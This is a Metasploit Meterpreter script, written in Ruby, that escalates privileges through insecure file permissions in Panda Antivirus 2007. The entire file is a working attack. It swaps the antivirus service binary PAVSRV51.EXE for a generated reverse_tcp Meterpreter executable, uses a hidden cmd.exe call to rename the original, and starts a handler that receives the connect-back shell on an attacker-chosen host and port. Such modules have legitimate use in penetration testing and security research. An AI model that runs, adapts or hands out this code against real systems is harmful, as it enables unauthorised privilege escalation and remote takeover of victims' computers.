##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# Panda Antivirus 2007 Local Privilege Escalation
# This module exploits a privilege escalation vulnerability in
# Panda Antivirus 2007. Due to insecure permission issues, a
# local attacker can gain elevated privileges.
#
# This script has only been tested against Panda Antivirus 2007.
#
# BID - 4257
# mc[@]metasploit.com
##

#
# Options
#
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
  "-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
)

#
# Default parameters
#
rhost = nil
rport = nil

def usage
  print_status("Panda Antivirus 2007 Privilege Escalation.")
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end

#
# Option parsing
#
@exec_opts.parse(args) do |opt, idx, val|
  case opt
    when "-r"
      rhost = val
    when "-p"
      rport = val.to_i
    else
      usage
    end
end

if rhost.nil? or rport.nil?
  usage
elsif client.platform =~ /win32|win64/
  client.sys.process.get_processes().each do |m|

    if ( m['name'] =~ /PAVSRV51\.EXE/ )
      print_status("Found vulnerable process #{m['name']} with pid #{m['pid']}.")

      # Build out the exe payload.
      pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
      pay.datastore['LHOST'] = rhost
      pay.datastore['LPORT'] = rport
      raw  = pay.generate

      exe = Msf::Util::EXE.to_win32pe(client.framework, raw)

      # Change to our working directory.
      workingdir = client.fs.file.expand_path("%ProgramFiles%")
      client.fs.dir.chdir(workingdir + "\\Panda Software\\Panda Antivirus 2007\\")

      # Create a backup of the original exe.
      print_status("Creating a copy of PAVSRV51 (PAVSRV51_back.EXE)...")
      client.sys.process.execute("cmd.exe /c rename PAVSRV51.EXE PAVSRV51_back.EXE", nil, {'Hidden' => 'true'})

      # Place our newly created exe with the orginal binary name.
      tempdir = client.fs.file.expand_path("%ProgramFiles%")
      tempexe = tempdir + "\\Panda Software\\Panda Antivirus 2007\\" + "PAVSRV51.EXE"

      print_status("Sending EXE payload '#{tempexe}'.")
      fd = client.fs.file.new(tempexe, "wb")
      fd.write(exe)
      fd.close

      print_status("Done, now just wait for the callback...")

      # Our handler to recieve the callback.
      handler = client.framework.exploits.create("multi/handler")
      handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
      handler.datastore['LHOST']   = rhost
      handler.datastore['LPORT']   = rport
      # Keep our shell stable.
      handler.datastore['InitialAutoRunScript'] = "migrate -f"
      handler.datastore['ExitOnSession'] = false

      handler.exploit_simple(
        'Payload'        => handler.datastore['PAYLOAD'],
        'RunAsJob'       => true
      )
    end
  end
else
  print_error("This version of Meterpreter is not supported with this script!")
  raise Rex::Script::Completed
end
